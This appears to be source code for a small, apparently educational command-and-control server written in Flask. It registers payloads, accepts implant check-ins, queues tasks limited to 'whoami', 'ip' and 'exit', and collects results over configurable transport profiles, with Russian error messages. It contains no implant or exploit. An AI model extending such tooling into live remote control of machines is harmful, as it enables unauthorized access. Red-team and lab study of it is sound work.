import json
import os
from secrets import compare_digest, token_hex
from uuid import uuid4
from flask import Flask, abort, flash, redirect, render_template, request, session, url_for
from werkzeug.exceptions import HTTPException
from profiles import PROFILES, validate_profile
from database import (
    create_callback, create_payload, create_task, get_callback_id,
    get_next_task, get_payload, get_callback_payload_id, get_state, init_db, poll_task, save_result
)

app = Flask(__name__)
app.secret_key = token_hex(32)
app.config.update(
    MAX_CONTENT_LENGTH=65536,
    TRUSTED_HOSTS=["127.0.0.1", "localhost"],
    SESSION_COOKIE_SAMESITE="Strict",
    SESSION_COOKIE_HTTPONLY=True
)


@app.errorhandler(HTTPException)
def http_error(error):
    response = error.get_response()
    response.data = json.dumps({"error": error.description}, ensure_ascii=False)
    response.content_type = "application/json"
    return response


def read_profile_data(operation):
    payload_uuid = request.headers.get("X-Payload-UUID")
    if not payload_uuid:
        abort(400, "Нужен заголовок X-Payload-UUID")
    payload = get_payload(payload_uuid)
    if payload is None:
        abort(404, "Payload не найден")
    rule = payload["profile"][operation]
    if request.method != rule["method"]:
        abort(405, "Метод не соответствует профилю")
    if rule["transport"] == "json":
        if not request.is_json:
            abort(415, "Профиль требует application/json")
        source = request.get_json(silent=True)
    elif rule["transport"] == "form":
        if request.mimetype != "application/x-www-form-urlencoded":
            abort(415, "Профиль требует application/x-www-form-urlencoded")
        source = request.form
    else:
        source = request.args
    if source is None or not hasattr(source, "get"):
        abort(400, "Нужен объект с полями запроса")
    value = source.get(rule["field"])
    if operation == "post_task":
        if rule["transport"] != "json":
            try:
                value = json.loads(value)
            except (TypeError, ValueError):
                abort(400, "В поле результата нужна JSON-строка")
        if not isinstance(value, dict):
            abort(400, "Результат должен быть объектом")
        callback_uuid = value.get("callback_uuid")
    else:
        if not isinstance(value, str) or not value:
            abort(400, f"Нужно поле {rule['field']}")
        callback_uuid = value
    if operation == "checkin":
        if value != payload_uuid:
            abort(403, "Payload в поле и заголовке не совпадают")
    else:
        if not isinstance(callback_uuid, str) or not callback_uuid:
            abort(400, "Нужен callback_uuid")
        owner = get_callback_payload_id(callback_uuid)
        if owner is None:
            abort(404, "Callback не найден")
        if owner != payload["id"]:
            abort(403, "Callback относится к другому payload")
    return value, payload["id"]


def task_json(task):
    if task is None:
        return {"task": None}
    return {"task": {"task_id": task[0], "command": task[1]}}


def add_task_data(data):
    callback_uuid = data.get("callback_uuid")
    command = data.get("command")
    if not isinstance(callback_uuid, str) or not callback_uuid:
        return {"error": "callback_uuid required"}, 400
    if command not in ("whoami", "ip", "exit"):
        return {"error": "дай норм команду"}, 400
    try:
        task_id = create_task(callback_uuid, command)
    except ValueError as error:
        return {"error": str(error)}, 409
    if task_id is None:
        return {"error": "колбека такого нету"}, 404
    return {"task_id": task_id, "status": "pending"}, 201


@app.get("/ping")
def ping():
    return {"message": "pong", "status": "ok"}


@app.get("/favicon.ico")
def favicon():
    return "", 204


@app.route("/checkin", methods=["GET", "POST"])
def checkin():
    _, payload_id = read_profile_data("checkin")
    callback_uuid = str(uuid4())
    create_callback(callback_uuid, payload_id)
    return {"callback_uuid": callback_uuid}, 201


@app.post("/payloads")
def add_payload():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return {"error": "ДЖЕЙСОНА ДАЙ"}, 400
    profile = data.get("profile", "standard")
    if isinstance(profile, str):
        profile = PROFILES.get(profile)
    try:
        validate_profile(profile)
    except ValueError as error:
        return {"error": str(error)}, 400
    payload_uuid = str(uuid4())
    create_payload(payload_uuid, profile)
    return {"payload_uuid": payload_uuid, "profile": profile}, 201


@app.post("/tasks")
def add_task():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return {"error": "ДЖЕЙСОНА ДАЙ"}, 400
    return add_task_data(data)


@app.get("/tasks/<callback_uuid>")
def next_task(callback_uuid):
    callback_id = get_callback_id(callback_uuid)
    if callback_id is None:
        return {"error": "callback not found"}, 404
    return task_json(get_next_task(callback_id))


@app.route("/poll", methods=["GET", "POST"])
def poll():
    callback_uuid, _ = read_profile_data("get_task")
    try:
        task = poll_task(callback_uuid)
    except LookupError as error:
        return {"error": str(error)}, 404
    except ValueError as error:
        return {"error": str(error)}, 410
    return task_json(task)


@app.route("/results", methods=["GET", "POST"])
def results():
    data, _ = read_profile_data("post_task")
    if not isinstance(data.get("callback_uuid"), str) or type(data.get("task_id")) is not int:
        return {"error": "Нужны callback_uuid и целый task_id"}, 400
    result = data.get("result")
    if not isinstance(result, str) or len(result) > 20000:
        return {"error": "Результат должен быть строкой до 20000 символов"}, 400
    try:
        save_result(data["callback_uuid"], data["task_id"], result)
    except LookupError as error:
        return {"error": str(error)}, 404
    except ValueError as error:
        return {"error": str(error)}, 409
    return {"status": "completed"}


@app.get("/state")
def state():
    return get_state()


@app.get("/")
def index():
    if "csrf" not in session:
        session["csrf"] = token_hex(24)
    return render_template(
        "index.html", **get_state(), csrf=session["csrf"],
        selected=request.args.get("callback"), command=request.args.get("command", "whoami")
    )


@app.post("/ui/tasks")
def ui_task():
    token = request.form.get("csrf", "")
    if not token.isascii() or not session.get("csrf") or not compare_digest(token, session["csrf"]):
        return "Обнови страницу и попробуй ещё раз", 403
    data, status = add_task_data(request.form)
    flash(data["error"] if status != 201 else f"Задача №{data['task_id']} добавлена")
    return redirect(url_for(
        "index", callback=request.form.get("callback_uuid"), command=request.form.get("command")
    ), code=303)


@app.after_request
def headers(response):
    response.headers["Cache-Control"] = "no-store"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; style-src 'self'; script-src 'none'; "
        "frame-ancestors 'none'; form-action 'self'; base-uri 'self'"
    )
    return response


if __name__ == "__main__":
    init_db()
    app.run(host="127.0.0.1", port=int(os.environ.get("BOT_PORT", "5000")))
